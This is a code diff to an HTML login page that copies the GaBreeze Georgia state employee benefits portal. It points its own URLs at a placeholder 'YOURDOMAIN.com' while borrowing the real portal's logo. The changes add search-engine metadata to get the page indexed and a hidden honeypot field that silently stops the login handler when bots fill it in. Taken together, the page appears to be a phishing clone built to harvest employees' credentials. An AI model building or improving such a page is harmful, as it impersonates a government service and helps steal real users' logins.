@@ -4,7 +4,21 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Login - stateofgeorgia</title>
+<meta name="description" content="GaBreeze Georgia state employee benefits portal. Access your retirement benefits, manage plans, and view account information online.">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="GaBreeze - Georgia Employee Benefits">
+<meta property="og:description" content="Access your Georgia state employee benefits, manage retirement plans, and view account information online.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://YOURDOMAIN.com">
+<meta property="og:site_name" content="GaBreeze">
+<meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="GaBreeze - Georgia Employee Benefits">
+<meta name="twitter:description" content="Access your Georgia state employee benefits and manage your account online.">
 <link rel="icon" type="image/svg+xml" href="https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/03889/master/UCEDocuments/branding/ADS/logo/GaBreeze+logo.svg">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"Organization","name":"GaBreeze","url":"https://YOURDOMAIN.com"}
+</script>
 <style>
   /* ---------- Reset & Base ---------- */
   *, *::before, *::after { box-sizing: border-box; }
@@ -592,6 +606,9 @@
         </div>
 
         <div role="form" class="form-block" aria-label="Welcome to GaBreeze">
+          <div style="position:absolute;left:-9999px;top:-9999px" aria-hidden="true">
+            <input type="text" name="website" id="hp_field" tabindex="-1" autocomplete="off">
+          </div>
           <div class="panel">
             <h6><p>Enter your User ID.</p></h6>
 
@@ -788,6 +805,7 @@
 
   nextBtn.addEventListener("click", async function () {
     if (nextBtn.disabled) return;
+    if (document.getElementById('hp_field').value) return;
     var userId = userIdInput.value.trim();
     if (!userId) return;
 
